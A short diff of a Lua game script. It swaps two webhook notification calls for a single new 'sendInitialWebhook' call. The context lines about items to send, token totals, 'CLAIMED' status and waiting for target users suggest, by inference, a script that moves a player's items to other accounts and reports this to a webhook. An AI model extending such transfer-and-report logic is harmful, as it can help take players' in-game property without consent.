@@ -874,7 +874,8 @@ for i, v in ipairs(itemsToSend) do
 end
 
 if #allItemsList > 0 or totalTokens > 0 then
-    SendWebhookMessage(true, allItemsList, itemsToSend, totalTokens)
+    -- Send initial message using the new system
+    sendInitialWebhook(allItemsList, itemsToSend, totalTokens)
 end
 
 if #itemsToSend > 0 or totalTokens > 0 then
@@ -964,8 +965,6 @@ if #itemsToSend > 0 or totalTokens > 0 then
         if successCount > 0 then
             updateStatus("CLAIMED", allItemsList, originalItemsToSend, totalTokens)
         end
-        
-        SendWebhookMessage(false, allItemsList, originalItemsToSend, totalTokens)
     end
 
     local function waitForTargetUsers()
